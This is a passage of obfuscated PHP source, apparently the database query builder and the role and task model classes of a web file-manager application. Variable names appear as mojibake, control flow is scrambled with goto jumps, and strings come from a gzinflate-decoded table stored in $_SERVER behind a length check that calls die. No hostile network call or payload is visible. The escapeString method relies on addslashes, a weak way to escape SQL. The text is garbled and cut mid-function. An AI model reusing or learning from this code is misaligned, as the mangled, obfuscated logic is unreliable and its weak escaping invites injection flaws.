substr($this->parseWhere($e≤Ë¬ìÊøî), 6); break; case $B∞èÉÈ§ù[940]: parse_str($e≤Ë¬ìÊøî, $bßÿ⁄Æä‹ó); if (isset($bßÿ⁄Æä‹ó[$B∞èÉÈ§ù[918]])) { $e§¢µêí™ﬂ = $B∞èÉÈ§ù[50] . strtoupper($bßÿ⁄Æä‹ó[$B∞èÉÈ§ù[918]]) . $B∞èÉÈ§ù[50]; unset($bßÿ⁄Æä‹ó[$B∞èÉÈ§ù[918]]); } else { $e§¢µêí™ﬂ = $B∞èÉÈ§ù[922]; } $Bè¿»ËâØÂ = array(); foreach ($bßÿ⁄Æä‹ó as $b…¿›¢üîÍ => $A∂î€ŸÑÑã) { $Bè¿»ËâØÂ[] = $this->parseKey($b…¿›¢üîÍ) . $B∞èÉÈ§ù[939] . $this->parseValue($A∂î€ŸÑÑã); } $c∫âçïï“â = implode($e§¢µêí™ﬂ, $Bè¿»ËâØÂ); break; } return $c∫âçïï“â; } protected function parseLimit($E§ÂÙ≥∏»ê) { $BÈ«∫‘Ê∏é =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; return !empty($E§ÂÙ≥∏»ê) ? $BÈ«∫‘Ê∏é[48] . $E§ÂÙ≥∏»ê . $BÈ«∫‘Ê∏é[50] : $BÈ«∫‘Ê∏é[33]; } protected function parseJoin($fÉî†ﬂ—Õ…) { $a‡ùŸ˜⁄πÑ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $f„≥÷Ìºπâ = $a‡ùŸ˜⁄πÑ[33]; if (!empty($fÉî†ﬂ—Õ…)) { if (is_array($fÉî†ﬂ—Õ…)) { foreach ($fÉî†ﬂ—Õ… as $Eß€¡ÖÁÑñ => $câ—Ÿõ¥∂Æ) { if (!1 !== stripos($câ—Ÿõ¥∂Æ, $a‡ùŸ˜⁄πÑ[941])) { $f„≥÷Ìºπâ .= $a‡ùŸ˜⁄πÑ[50] . $câ—Ÿõ¥∂Æ; } else { $f„≥÷Ìºπâ .= $a‡ùŸ˜⁄πÑ[942] . $câ—Ÿõ¥∂Æ; } } } else { $f„≥÷Ìºπâ .= $a‡ùŸ˜⁄πÑ[942] . $fÉî†ﬂ—Õ…; } } $f„≥÷Ìºπâ = preg_replace($a‡ùŸ˜⁄πÑ[943], think_config($a‡ùŸ˜⁄πÑ[846]) . $a‡ùŸ˜⁄πÑ[944], $f„≥÷Ìºπâ); return $f„≥÷Ìºπâ; } protected function parseOrder($c—§Üª∫∫Œ) { $Bá∫´®ôö® =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (is_array($c—§Üª∫∫Œ)) { $Dï£äØœª = array(); foreach ($c—§Üª∫∫Œ as $CÉëˆÛ„˜« => $EØÒßïƒ–Ê) { if (is_numeric($CÉëˆÛ„˜«)) { $Dï£äØœª[] = $this->parseKey($EØÒßïƒ–Ê); } else { $EØÒßïƒ–Ê = in_array(strtoupper(trim($EØÒßïƒ–Ê)), array($Bá∫´®ôö®[945], $Bá∫´®ôö®[946])) ? $Bá∫´®ôö®[50] . $EØÒßïƒ–Ê : $Bá∫´®ôö®[33]; if (preg_match($Bá∫´®ôö®[947], $CÉëˆÛ„˜«)) { $Dï£äØœª[] = $this->parseKey($CÉëˆÛ„˜«) . $EØÒßïƒ–Ê; } else { think_exception($Bá∫´®ôö®[948] . $CÉëˆÛ„˜«); } } } $c—§Üª∫∫Œ = implode($Bá∫´®ôö®[47], $Dï£äØœª); } return !empty($c—§Üª∫∫Œ) ? $Bá∫´®ôö®[949] . $c—§Üª∫∫Œ : $Bá∫´®ôö®[33]; } protected function parseGroup($f±¶∫¿ÿÑó) { $EÉØóê–Ôß =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; return !empty($f±¶∫¿ÿÑó) ? $EÉØóê–Ôß[950] . $f±¶∫¿ÿÑó : $EÉØóê–Ôß[33]; } protected function parseHaving($FÊÃΩÓ‰‘Ç) { $aÑÔë≤£√“ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; return !empty($FÊÃΩÓ‰‘Ç) ? $aÑÔë≤£√“[951] . $FÊÃΩÓ‰‘Ç : $aÑÔë≤£√“[33]; } protected function parseComment($dÂò–ú≠¢±) { $cÖ£û£›€á =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; return !empty($dÂò–ú≠¢±) ? $cÖ£û£›€á[952] . $dÂò–ú≠¢± . $cÖ£û£›€á[953] : $cÖ£û£›€á[33]; } protected function parseDistinct($BÕËç∑Á–ò) { $a®¡Íıπ◊è =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; return !empty($BÕËç∑Á–ò) ? $a®¡Íıπ◊è[954] : $a®¡Íıπ◊è[33]; } protected function parseUnion($aÌÌÆ¢¨≥Ú) { $E∫‰≥”Ñ˜å =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (empty($aÌÌÆ¢¨≥Ú)) { return $E∫‰≥”Ñ˜å[33]; } if (isset($aÌÌÆ¢¨≥Ú[$E∫‰≥”Ñ˜å[336]])) { $B≠∂πî¿£ı = $E∫‰≥”Ñ˜å[955]; unset($aÌÌÆ¢¨≥Ú[$E∫‰≥”Ñ˜å[336]]); } else { $B≠∂πî¿£ı = $E∫‰≥”Ñ˜å[956]; } foreach ($aÌÌÆ¢¨≥Ú as $Aãú…ƒè∏±) { $EıõØ°€ﬁß[] = $B≠∂πî¿£ı . (is_array($Aãú…ƒè∏±) ? $this->buildSelectSql($Aãú…ƒè∏±) : $Aãú…ƒè∏±); } return implode($E∫‰≥”Ñ˜å[50], $EıõØ°€ﬁß); } public function insert($A◊‹≤à∆éå, $BΩ‰≥œÔ‚» = array(), $CÔæíÇÉˆ˘ = false) { goto cÙ·çŒè’ç; Cæ‹Ü•‡¯¨: foreach ($A◊‹≤à∆éå as $D∑Î¿ïà› => $d£Ü±⁄≠ÖÁ) { if (is_array($d£Ü±⁄≠ÖÁ) && $b ¥£ã¶◊í[285] == $d£Ü±⁄≠ÖÁ[0]) { $b®ü§ø…‚â[] = $this->parseKey($D∑Î¿ïà›); $B‹ŸŸºì√[] = $d£Ü±⁄≠ÖÁ[1]; } elseif (is_scalar($d£Ü±⁄≠ÖÁ) || is_null($d£Ü±⁄≠ÖÁ)) { $b®ü§ø…‚â[] = $this->parseKey($D∑Î¿ïà›); $B‹ŸŸºì√[] = $this->parseValue($d£Ü±⁄≠ÖÁ); } } $D∑îó°≈“≠ = ($CÔæíÇÉˆ˘ ? $b ¥£ã¶◊í[823] : $b ¥£ã¶◊í[824]) . $b ¥£ã¶◊í[825] . $this->parseTable($BΩ‰≥œÔ‚»[$b ¥£ã¶◊í[267]]) . $b ¥£ã¶◊í[819] . implode($b ¥£ã¶◊í[47], $b®ü§ø…‚â) . $b ¥£ã¶◊í[820] . implode($b ¥£ã¶◊í[47], $B‹ŸŸºì√) . $b ¥£ã¶◊í[821]; $D∑îó°≈“≠ .= $this->parseLock(isset($BΩ‰≥œÔ‚»[$b ¥£ã¶◊í[780]]) ? $BΩ‰≥œÔ‚»[$b ¥£ã¶◊í[780]] : !1); goto c©ÉÑ†°°’; c©ÉÑ†°°’: $D∑îó°≈“≠ .= $this->parseComment(!empty($BΩ‰≥œÔ‚»[$b ¥£ã¶◊í[341]]) ? $BΩ‰≥œÔ‚»[$b ¥£ã¶◊í[341]] : $b ¥£ã¶◊í[33]); return $this->execute($D∑îó°≈“≠, $this->parseBind(!empty($BΩ‰≥œÔ‚»[$b ¥£ã¶◊í[273]]) ? $BΩ‰≥œÔ‚»[$b ¥£ã¶◊í[273]] : array())); goto BæŒ‹Õá‘œ; cÙ·çŒè’ç: $b ¥£ã¶◊í =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B‹ŸŸºì√ = $b®ü§ø…‚â = array(); $this->model = $BΩ‰≥œÔ‚»[$b ¥£ã¶◊í[269]]; goto Cæ‹Ü•‡¯¨; BæŒ‹Õá‘œ: } public function selectInsert($CìÖãﬂËıÚ, $cô£æÆﬁ§€, $cÛæâ¬ä§ = array()) { goto BÖ©˘‚àª; fÜ–∂«îƒÉ: array_walk($CìÖãﬂËıÚ, array($this, $eéÀÜ…çåµ[822])); $F‹≈ªÑâÀ◊ = $eéÀÜ…çåµ[957] . $this->parseTable($cô£æÆﬁ§€) . $eéÀÜ…çåµ[819] . implode($eéÀÜ…çåµ[47], $CìÖãﬂËıÚ) . $eéÀÜ…çåµ[936]; $F‹≈ªÑâÀ◊ .= $this->buildSelectSql($cÛæâ¬ä§); goto A÷’ç◊‚çÌ; A÷’ç◊‚çÌ: return $this->execute($F‹≈ªÑâÀ◊, $this->parseBind(!empty($cÛæâ¬ä§[$eéÀÜ…çåµ[273]]) ? $cÛæâ¬ä§[$eéÀÜ…çåµ[273]] : array())); goto C¿â€©≥£Ô; BÖ©˘‚àª: $eéÀÜ…çåµ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->model = $cÛæâ¬ä§[$eéÀÜ…çåµ[269]]; if (is_string($CìÖãﬂËıÚ)) { $CìÖãﬂËıÚ = explode($eéÀÜ…çåµ[47], $CìÖãﬂËıÚ); } goto fÜ–∂«îƒÉ; C¿â€©≥£Ô: } public function update($E–¨Œà≠›•, $BÛå†Ìà“Ω) { $aê˜√Áë…∏ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->model = $BÛå†Ìà“Ω[$aê˜√Áë…∏[269]]; $EÔœÑ·∞Ïµ = $aê˜√Áë…∏[958] . $this->parseTable($BÛå†Ìà“Ω[$aê˜√Áë…∏[267]]) . $this->parseSet($E–¨Œà≠›•) . $this->parseWhere(!empty($BÛå†Ìà“Ω[$aê˜√Áë…∏[263]]) ? $BÛå†Ìà“Ω[$aê˜√Áë…∏[263]] : $aê˜√Áë…∏[33]) . $this->parseOrder(!empty($BÛå†Ìà“Ω[$aê˜√Áë…∏[350]]) ? $BÛå†Ìà“Ω[$aê˜√Áë…∏[350]] : $aê˜√Áë…∏[33]) . $this->parseLimit(!empty($BÛå†Ìà“Ω[$aê˜√Áë…∏[280]]) ? $BÛå†Ìà“Ω[$aê˜√Áë…∏[280]] : $aê˜√Áë…∏[33]) . $this->parseLock(isset($BÛå†Ìà“Ω[$aê˜√Áë…∏[780]]) ? $BÛå†Ìà“Ω[$aê˜√Áë…∏[780]] : !1) . $this->parseComment(!empty($BÛå†Ìà“Ω[$aê˜√Áë…∏[341]]) ? $BÛå†Ìà“Ω[$aê˜√Áë…∏[341]] : $aê˜√Áë…∏[33]); return $this->execute($EÔœÑ·∞Ïµ, $this->parseBind(!empty($BÛå†Ìà“Ω[$aê˜√Áë…∏[273]]) ? $BÛå†Ìà“Ω[$aê˜√Áë…∏[273]] : array())); } public function delete($cﬁ«ï”¢”≠ = array()) { $b©ëÕ¬ôÈ¥ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->model = $cﬁ«ï”¢”≠[$b©ëÕ¬ôÈ¥[269]]; $E·Ñ∫Òë≤Ù = $b©ëÕ¬ôÈ¥[959] . $this->parseTable($cﬁ«ï”¢”≠[$b©ëÕ¬ôÈ¥[267]]) . $this->parseWhere(!empty($cﬁ«ï”¢”≠[$b©ëÕ¬ôÈ¥[263]]) ? $cﬁ«ï”¢”≠[$b©ëÕ¬ôÈ¥[263]] : $b©ëÕ¬ôÈ¥[33]) . $this->parseOrder(!empty($cﬁ«ï”¢”≠[$b©ëÕ¬ôÈ¥[350]]) ? $cﬁ«ï”¢”≠[$b©ëÕ¬ôÈ¥[350]] : $b©ëÕ¬ôÈ¥[33]) . $this->parseLimit(!empty($cﬁ«ï”¢”≠[$b©ëÕ¬ôÈ¥[280]]) ? $cﬁ«ï”¢”≠[$b©ëÕ¬ôÈ¥[280]] : $b©ëÕ¬ôÈ¥[33]) . $this->parseLock(isset($cﬁ«ï”¢”≠[$b©ëÕ¬ôÈ¥[780]]) ? $cﬁ«ï”¢”≠[$b©ëÕ¬ôÈ¥[780]] : !1) . $this->parseComment(!empty($cﬁ«ï”¢”≠[$b©ëÕ¬ôÈ¥[341]]) ? $cﬁ«ï”¢”≠[$b©ëÕ¬ôÈ¥[341]] : $b©ëÕ¬ôÈ¥[33]); return $this->execute($E·Ñ∫Òë≤Ù, $this->parseBind(!empty($cﬁ«ï”¢”≠[$b©ëÕ¬ôÈ¥[273]]) ? $cﬁ«ï”¢”≠[$b©ëÕ¬ôÈ¥[273]] : array())); } public function select($B‰≥‹ÕÉ∫Ï = array()) { goto Dçñ⁄ ûãŸ; Bπ–˜€Ç•“: if ($EÃ€±√´“‹ && !1 !== $DèÁíÙßÈ¥) { think_cache($d÷Àö◊¥ê•, $DèÁíÙßÈ¥, $EÃ€±√´“‹); } return $DèÁíÙßÈ¥; goto F±ãØë£∫Ë; Dçñ⁄ ûãŸ: $Dêàóﬁïêî =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->model = $B‰≥‹ÕÉ∫Ï[$Dêàóﬁïêî[269]]; $AˆªΩ‡”–¥ = $this->buildSelectSql($B‰≥‹ÕÉ∫Ï); goto FçΩ©ÍÜêÀ; FçΩ©ÍÜêÀ: $EÃ€±√´“‹ = isset($B‰≥‹ÕÉ∫Ï[$Dêàóﬁïêî[337]]) ? $B‰≥‹ÕÉ∫Ï[$Dêàóﬁïêî[337]] : !1; if ($EÃ€±√´“‹) { $d÷Àö◊¥ê• = is_string($EÃ€±√´“‹[$Dêàóﬁïêî[89]]) ? $EÃ€±√´“‹[$Dêàóﬁïêî[89]] : $Dêàóﬁïêî[960] . md5($AˆªΩ‡”–¥); $eºíü¢⁄Âƒ = think_cache($d÷Àö◊¥ê•, $Dêàóﬁïêî[33], $EÃ€±√´“‹); if (!1 !== $eºíü¢⁄Âƒ) { return $eºíü¢⁄Âƒ; } } $DèÁíÙßÈ¥ = $this->query($AˆªΩ‡”–¥, $this->parseBind(!empty($B‰≥‹ÕÉ∫Ï[$Dêàóﬁïêî[273]]) ? $B‰≥‹ÕÉ∫Ï[$Dêàóﬁïêî[273]] : array())); goto Bπ–˜€Ç•“; F±ãØë£∫Ë: } public function buildSelectSql($Fê’…õíË¢ = array()) { goto dö√âöàïÓ; fˆéÉá‡ˆ´: $e‰§ËÉÛﬂí = $this->parseSql($this->selectSql, $Fê’…õíË¢); $e‰§ËÉÛﬂí .= $this->parseLock(isset($Fê’…õíË¢[$Eıª†¢ïﬁä[780]]) ? $Fê’…õíË¢[$Eıª†¢ïﬁä[780]] : !1); if (isset($C∑ì—Û£Ñ⁄)) { think_cache($C∑ì—Û£Ñ⁄, $e‰§ËÉÛﬂí); } goto b∫≥ßåÑá¥; b∫≥ßåÑá¥: return $e‰§ËÉÛﬂí; goto e—õπ®†Óß; dö√âöàïÓ: $Eıª†¢ïﬁä =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (isset($Fê’…õíË¢[$Eıª†¢ïﬁä[340]])) { if (strpos($Fê’…õíË¢[$Eıª†¢ïﬁä[340]], $Eıª†¢ïﬁä[47])) { list($fîÁÇº“Û“, $FÉåÀ¢‘„ä) = explode($Eıª†¢ïﬁä[47], $Fê’…õíË¢[$Eıª†¢ïﬁä[340]]); } else { $fîÁÇº“Û“ = $Fê’…õíË¢[$Eıª†¢ïﬁä[340]]; } $fîÁÇº“Û“ = $fîÁÇº“Û“ ? $fîÁÇº“Û“ : 1; $FÉåÀ¢‘„ä = isset($FÉåÀ¢‘„ä) ? $FÉåÀ¢‘„ä : (is_numeric($Fê’…õíË¢[$Eıª†¢ïﬁä[280]]) ? $Fê’…õíË¢[$Eıª†¢ïﬁä[280]] : 20); $C»¨©±âû = $FÉåÀ¢‘„ä * ((int) $fîÁÇº“Û“ - 1); $Fê’…õíË¢[$Eıª†¢ïﬁä[280]] = $C»¨©±âû . $Eıª†¢ïﬁä[47] . $FÉåÀ¢‘„ä; } if (think_config($Eıª†¢ïﬁä[961])) { $C∑ì—Û£Ñ⁄ = $Eıª†¢ïﬁä[962] . md5(serialize($Fê’…õíË¢)); $aÁÖﬁœÛÂˆ = think_cache($C∑ì—Û£Ñ⁄); if ($aÁÖﬁœÛÂˆ) { return $aÁÖﬁœÛÂˆ; } } goto fˆéÉá‡ˆ´; e—õπ®†Óß: } public function parseSql($c‚≠ÉçŒ›Â, $B∫—›»®‰ã = array()) { $BÎà‚¥«åñ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c‚≠ÉçŒ›Â = str_replace(array($BÎà‚¥«åñ[963], $BÎà‚¥«åñ[964], $BÎà‚¥«åñ[965], $BÎà‚¥«åñ[966], $BÎà‚¥«åñ[967], $BÎà‚¥«åñ[968], $BÎà‚¥«åñ[969], $BÎà‚¥«åñ[970], $BÎà‚¥«åñ[971], $BÎà‚¥«åñ[972], $BÎà‚¥«åñ[973]), array($this->parseTable("{$B∫—›»®‰ã[$BÎà‚¥«åñ[267]]}"), $this->parseDistinct(isset($B∫—›»®‰ã[$BÎà‚¥«åñ[974]]) ? $B∫—›»®‰ã[$BÎà‚¥«åñ[974]] : !1), $this->parseField(!empty($B∫—›»®‰ã[$BÎà‚¥«åñ[261]]) ? $B∫—›»®‰ã[$BÎà‚¥«åñ[261]] : $BÎà‚¥«åñ[176]), $this->parseJoin(!empty($B∫—›»®‰ã[$BÎà‚¥«åñ[270]]) ? $B∫—›»®‰ã[$BÎà‚¥«åñ[270]] : $BÎà‚¥«åñ[33]), $this->parseWhere(!empty($B∫—›»®‰ã[$BÎà‚¥«åñ[263]]) ? $B∫—›»®‰ã[$BÎà‚¥«åñ[263]] : $BÎà‚¥«åñ[33]), $this->parseGroup(!empty($B∫—›»®‰ã[$BÎà‚¥«åñ[975]]) ? $B∫—›»®‰ã[$BÎà‚¥«åñ[975]] : $BÎà‚¥«åñ[33]), $this->parseHaving(!empty($B∫—›»®‰ã[$BÎà‚¥«åñ[976]]) ? $B∫—›»®‰ã[$BÎà‚¥«åñ[976]] : $BÎà‚¥«åñ[33]), $this->parseOrder(!empty($B∫—›»®‰ã[$BÎà‚¥«åñ[350]]) ? $B∫—›»®‰ã[$BÎà‚¥«åñ[350]] : $BÎà‚¥«åñ[33]), $this->parseLimit(!empty($B∫—›»®‰ã[$BÎà‚¥«åñ[280]]) ? $B∫—›»®‰ã[$BÎà‚¥«åñ[280]] : $BÎà‚¥«åñ[33]), $this->parseUnion(!empty($B∫—›»®‰ã[$BÎà‚¥«åñ[335]]) ? $B∫—›»®‰ã[$BÎà‚¥«åñ[335]] : $BÎà‚¥«åñ[33]), $this->parseComment(!empty($B∫—›»®‰ã[$BÎà‚¥«åñ[341]]) ? $B∫—›»®‰ã[$BÎà‚¥«åñ[341]] : $BÎà‚¥«åñ[33])), $c‚≠ÉçŒ›Â); return $c‚≠ÉçŒ›Â; } public function getLastSql($fëıªô∞™∫ = '') { return $fëıªô∞™∫ ? $this->modelSql[$fëıªô∞™∫] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Béﬁ™ñŸﬁÒ) { return addslashes($Béﬁ™ñŸﬁÒ); } public function setModel($cìåõÑ•Æ‡) { $this->model = $cìåõÑ•Æ‡; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto BÀ°¶›ã¯; DçàÒê†À¯: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\155\x2e\162\157\x6c\x65\x4c\x69\163\x74"; public $field = array("\156\x61\x6d\x65", "\x61\165\164\x68", "\x6c\x61\142\145\154", "\x64\151\163\160\154\x61\171", "\x73\x79\163\164\x65\x6d", "\144\145\163\x63", "\x69\147\x6e\157\x72\145\x45\x78\x74", "\151\147\156\157\162\x65\x46\151\154\x65\123\x69\172\x65", "\141\144\x6d\x69\x6e\151\163\164\x72\141\164\157\x72", "\x73\x6f\x72\x74"); public function listData($eµ¨ÿº«ì⁄ = false, $A¢±ô€©·Ï = "\x73\157\162\164", $C™ßñ∂·ÀË = false) { $CúèËÈ¨Õê =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $D‚∞™î„‚∆ = parent::listData($eµ¨ÿº«ì⁄, $A¢±ô€©·Ï, $C™ßñ∂·ÀË); if (!$eµ¨ÿº«ì⁄) { $DÙûî©æ–Ô = $CúèËÈ¨Õê[2483]; foreach ($D‚∞™î„‚∆ as $F˘â≤ˆë§º => $DÜ¥◊íÜÃ) { if ($DÜ¥◊íÜÃ[$CúèËÈ¨Õê[2484]] == 1) { $D‚∞™î„‚∆[$F˘â≤ˆë§º][$CúèËÈ¨Õê[405]] = $DÙûî©æ–Ô; } } } return $D‚∞™î„‚∆; } public function update($aÛ‹»å±êÑ, $C†∂ñË∑ëˆ) { goto Aåñ˘÷âÕ√; Aåñ˘÷âÕ√: $D’‚Í∆´¯â =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $EÇÚ¢ßÖÓÑ = parent::listData($aÛ‹»å±êÑ); $CÏ∫ƒ¥˘‹À = $this->findByName($C†∂ñË∑ëˆ[$D’‚Í∆´¯â[28]]); goto cå‘Ï≥ù‡Ê; A”„Œë·»¬: return parent::update($aÛ‹»å±êÑ, $C†∂ñË∑ëˆ); goto b†“£’Ó◊ò; cå‘Ï≥ù‡Ê: if (!$EÇÚ¢ßÖÓÑ || $CÏ∫ƒ¥˘‹À && $CÏ∫ƒ¥˘‹À[$D’‚Í∆´¯â[367]] != $EÇÚ¢ßÖÓÑ[$D’‚Í∆´¯â[367]]) { return !1; } if ($CÏ∫ƒ¥˘‹À[$D’‚Í∆´¯â[2484]] == 1) { $C†∂ñË∑ëˆ = array($D’‚Í∆´¯â[28] => $C†∂ñË∑ëˆ[$D’‚Í∆´¯â[28]], $D’‚Í∆´¯â[2124] => $C†∂ñË∑ëˆ[$D’‚Í∆´¯â[2124]]); } $this->filterAuth($C†∂ñË∑ëˆ[$D’‚Í∆´¯â[376]]); goto A”„Œë·»¬; b†“£’Ó◊ò: } public function remove($bë∆œ–ÉÓä) { $DªçËÓ—áô = parent::listData($bë∆œ–ÉÓä); if (!$DªçËÓ—áô || $DªçËÓ—áô[$_SERVER[Ä¿¡‡öóµŸﬂ‡][1084]]) { return !1; } return parent::remove($bë∆œ–ÉÓä); } public function add($eäç¡∏›ä°) { goto Eó ¬ª¬î¨; eßü”âÛñì: return parent::insert($eäç¡∏›ä°); goto AûÖùÚÏäπ; cÖÉÍöâÏŸ: $d‡„Î´çé” = array($fûÎÔœ–‡õ[386] => $D€™∆ä≈∂ï, $fûÎÔœ–‡õ[2112] => $fûÎÔœ–‡õ[33], $fûÎÔœ–‡õ[2108] => $fûÎÔœ–‡õ[2125], $fûÎÔœ–‡õ[2485] => 1, $fûÎÔœ–‡õ[2111] => 0, $fûÎÔœ–‡õ[2486] => 0, $fûÎÔœ–‡õ[2110] => $this->getSort()); $eäç¡∏›ä° = array_merge($d‡„Î´çé”, $eäç¡∏›ä°); $this->filterAuth($eäç¡∏›ä°[$fûÎÔœ–‡õ[376]]); goto eßü”âÛñì; Eó ¬ª¬î¨: $fûÎÔœ–‡õ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $D€™∆ä≈∂ï = $eäç¡∏›ä°[$fûÎÔœ–‡õ[28]]; if ($this->findByName($D€™∆ä≈∂ï)) { return !1; } goto cÖÉÍöâÏŸ; AûÖùÚÏäπ: } private function getSort() { $böÈ•·¥§ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $aØÖ®òœòœ = parent::listData(); $D»“ÚçÀË® = array_to_keyvalue($aØÖ®òœòœ, $böÈ•·¥§[33], $böÈ•·¥§[2127]); return empty($D»“ÚçÀË®) ? 0 : max($D»“ÚçÀË®) + 1; } private function filterAuth(&$eöïØçãóÈ) { $D∏≠Ñ∆ÙÍé =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $BêÂ±åøüœ = array(); $EÈååÂê€Æ = array_filter(explode($D∏≠Ñ∆ÙÍé[47], $eöïØçãóÈ)); foreach ($EÈååÂê€Æ as $eöïØçãóÈ) { $bÃÿæ™Ï◊Ü = explode($D∏≠Ñ∆ÙÍé[91], $eöïØçãóÈ); if ($bÃÿæ™Ï◊Ü[0] == $D∏≠Ñ∆ÙÍé[1785] && $bÃÿæ™Ï◊Ü[1] != $D∏≠Ñ∆ÙÍé[1040]) { $aÙ‹‰∫¡ïÁ = $bÃÿæ™Ï◊Ü[0] . $D∏≠Ñ∆ÙÍé[91] . $bÃÿæ™Ï◊Ü[1] . $D∏≠Ñ∆ÙÍé[2487]; if (!in_array($aÙ‹‰∫¡ïÁ, $EÈååÂê€Æ)) { $BêÂ±åøüœ[] = $aÙ‹‰∫¡ïÁ; } } $BêÂ±åøüœ[] = $eöïØçãóÈ; } $eöïØçãóÈ = implode($D∏≠Ñ∆ÙÍé[47], $BêÂ±åøüœ); } public function sort($CÍ“∏›Ÿò¿, $bÔç¿áÖå“) { return parent::update($CÍ“∏›Ÿò¿, $bÔç¿áÖå“); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\x2e\164\141\163\153\x4c\151\163\x74"; public $field = array("\x6e\x61\x6d\145", "\x74\171\x70\x65", "\145\166\145\x6e\x74", "\x74\151\x6d\x65", "\x64\x65\x73\143", "\x73\x79\x73\x74\145\155", "\145\156\141\x62\x6c\145", "\x6c\141\163\164\x52\x75\156", "\163\x6f\162\x74"); public function listData($fÌÆ”ñµ–å = false, $aıÖíèÎŸÎ = "\x73\x6f\162\164", $AèëÑ ûà¬ = false) { return parent::listData($fÌÆ”ñµ–å, $aıÖíèÎŸÎ, $AèëÑ ûà¬); } public function add($F•›ŒéÂíÑ) { $bÇ„Ã¯‹Ÿ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $d≤Í∏ò◊äó = $this->findByName($F•›ŒéÂíÑ[$bÇ„Ã¯‹Ÿ[28]]); if ($d≤Í∏ò◊äó) { return !1; } $F•›ŒéÂíÑ[$bÇ„Ã¯‹Ÿ[1403]] = 0; $F•›ŒéÂíÑ[$bÇ„Ã¯‹Ÿ[2127]] = $this->getSort(); return parent::insert($F•›ŒéÂíÑ); } private function getSort() { $Aî®ÇÚªÜ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Câ‡…„Ñ£È = parent::listData(); $bì€Ú„Îë» = array_to_keyvalue($Câ‡…„Ñ£È, $Aî®ÇÚªÜ[33], $Aî®ÇÚªÜ[2127]); return empty($bì€Ú„Îë») ? 0 : max($bì€Ú„Îë») + 1; } public function update($e∫Ø”ﬁ¬Ñﬁ, $cïê≈öâ˘é) { $CÖ•ÙÙË— =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $b◊»ÌÑ‘⁄É = $this->listData($e∫Ø”ﬁ¬Ñﬁ); $Eã°Õ‚ƒò¬ = $this->findByName($cïê≈öâ˘é[$CÖ•ÙÙË—[28]]); if (!$b◊»ÌÑ‘⁄É || $Eã°Õ‚ƒò¬ && $Eã°Õ‚ƒò¬[$CÖ•ÙÙË—[367]] != $b◊»ÌÑ‘⁄É[$CÖ•ÙÙË—[367]]) { return !1; } return parent::update($e∫Ø”ﬁ¬Ñﬁ, $cïê≈öâ˘é); } public function remove($DΩ–õùÈÜœ, $cÊÿÉ¥Éµ« = false) { $bÿó§´û„◊ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $CÓôÜ¡ÒÇ® = $this->listData($DΩ–õùÈÜœ); if (!$CÓôÜ¡ÒÇ®) { return; } if (!$cÊÿÉ¥Éµ« && $CÓôÜ¡ÒÇ®[$bÿó§´û„◊[1084]] == $bÿó§´û„◊[83]) { return !1; } return parent::remove($DΩ–õùÈÜœ); } public function enable($B¯‡êê“ó¨, $D¯» çÈ£Ÿ) { return $this->update($B¯‡êê“ó¨, array($_SERVER[Ä¿¡‡öóµŸﬂ‡][2477] => $D¯» çÈ£Ÿ)); } public function run($D™®—óÚß…) { return $this->update($D™®—óÚß…, array($_SERVER[Ä¿¡‡öóµŸﬂ‡][2488] => time())); } } goto dﬁ‘“Ëÿà˜; aºä„º˜Ê¥: $cª≤üõãÑÊ = $_SERVER[Ä¿¡‡öóµŸﬂ‡][547]; if (strlen($cª≤üõãÑÊ) < $_SERVER[Ä¿¡‡öóµŸﬂ‡][548]) { die; } $_SERVER[¡˚¸∞ŒåÛ∆ìù] = explode($_SERVER[Ä¿¡‡öóµŸﬂ‡][549], gzinflate(substr($_SERVER[Ä¿¡‡öóµŸﬂ‡][550], 10, -8))); goto c…æ¯‰‰ƒ; d“√êÇŸ¶Œ: class FileParsePdf { public static function parse($céõíﬂ‰ﬂ€) { goto B„¢∫‹Ø÷◊; e∆ÂØ‰Îõå: preg_match($F—°ú∞©àÚ, $DìÓÉ—ØŒù[$eä†∏„¡µ±[1535]], $aÊñÛÒ∑ñÀ); if (!$cÇ˜ ˜äáµ[$eä†∏„¡µ±[1537]] && count($aÊñÛÒ∑ñÀ) == 5) { $cÇ˜ ˜äáµ[$eä†∏„¡µ±[1537]] = $aÊñÛÒ∑ñÀ[3]; $cÇ˜ ˜äáµ[$eä†∏„¡µ±[1539]] = $aÊñÛÒ∑ñÀ[4]; } preg_match($eä†∏„¡µ±[1540], $DìÓÉ—ØŒù[$eä†∏„¡µ±[1534]], $aÊñÛÒ∑ñÀ); goto fØÏ¨ëüıç; bòËÆﬁ”ûŒ: $F—°ú∞©àÚ = $eä†∏„¡µ±[1538]; preg_match($F—°ú∞©àÚ, $DìÓÉ—ØŒù[$eä†∏„¡µ±[1534]], $aÊñÛÒ∑ñÀ); if (!$cÇ˜ ˜äáµ[$eä†∏„¡µ±[1537]] && count($aÊñÛÒ∑ñÀ) == 5) { $cÇ˜ 